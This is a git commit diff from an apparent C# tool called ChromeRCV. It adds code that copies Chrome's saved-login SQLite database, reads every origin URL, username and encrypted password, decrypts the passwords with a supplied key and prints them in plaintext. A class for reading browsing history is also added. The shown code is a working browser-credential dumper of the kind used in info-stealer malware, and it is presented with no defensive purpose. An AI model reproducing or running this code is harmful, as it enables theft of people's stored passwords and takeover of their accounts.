00557ec077824008b3712795fabf65596b1b2498
sumx86 <ichi256@abv.bg>
2021-05-03 08:58:15 +0100

    Add files via upload

---
+++ ChromiumHistory.cs
@@ -0,0 +1,50 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+
+namespace ChromeRCV
+{
+    internal sealed class ChromiumHistory
+    {
+        string _url;
+        string _title;
+        string _visitcount;
+
+        public string Url
+        {
+            get { return _url; } set { _url = value; }
+        }
+
+        public string Title
+        {
+            get { return _title; } set { _title = value; }
+        }
+
+        public string VisitCount
+        {
+            get { return _visitcount; } set { _visitcount = value; }
+        }
+
+        public ChromiumHistory(string url, string title, string visitcount)
+        {
+            _url = url;
+            _title = title;
+            _visitcount = visitcount;
+        }
+
+        public ChromiumHistory() { }
+
+        public void Print()
+        {
+            Console.WriteLine("URL    :  " + _url);
+            Console.WriteLine("TITLE  :  " + _title);
+            Console.WriteLine("VISITS :  " + _visitcount + "\r\n");
+        }
+    }
+
+    internal sealed class ChromiumHistoryManager
+    {
+
+    }
+}
--- ChromiumLogin.cs
+++ ChromiumLogin.cs
@@ -1,5 +1,8 @@
-using System;
+﻿using System;
 using System.Text;
+using System.IO;
+using System.Collections.Generic;
+using System.Data.SQLite;
 
 namespace ChromeRCV
 {
@@ -35,9 +38,44 @@ namespace ChromeRCV
 
         public void Print()
         {
-            Console.WriteLine("HOSTNAME:  " + _hostname);
-            Console.WriteLine("USERNAME:  " + _username);
-            Console.WriteLine("PASSWORD:  " + _password + "\r\n");
+            Console.WriteLine("ORIGIN_URL :  " + _hostname);
+            Console.WriteLine("USERNAME   :  " + _username);
+            Console.WriteLine("PASSWORD   :  " + _password + "\r\n");
+        }
+    }
+
+    internal sealed class ChromiumLoginManager
+    {
+        public static void GetData(string loginDataPath, byte[] key, ref List<ChromiumLogin> logins)
+        {
+            string tempFile = Utils.CreateTempFile(loginDataPath);
+            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;")) {
+                conn.Open();
+                using (SQLiteCommand comm = conn.CreateCommand()) {
+                    comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
+                    using (SQLiteDataReader reader = comm.ExecuteReader()) {
+
+                        while (reader.Read()) {
+                            string hostname = (string)reader["origin_url"];
+                            string username = (string)reader["username_value"];
+                            string password = Encoding.Default.GetString((byte[])reader["password_value"]);
+
+                            var c = new ChromiumLogin();
+                            c.Hostname = hostname;
+                            c.Username = username;
+                            c.Password = Crypt.DecryptPassword(password, key);
+                            logins.Add(c);
+                        }
+                    }
+                }
+                conn.Close();
+            }
+            try {
+                File.Delete(tempFile);
+            }
+            catch {
+                Console.WriteLine($"Failed to delete {tempFile.ToUpper()}");
+            }
         }
     }
 }
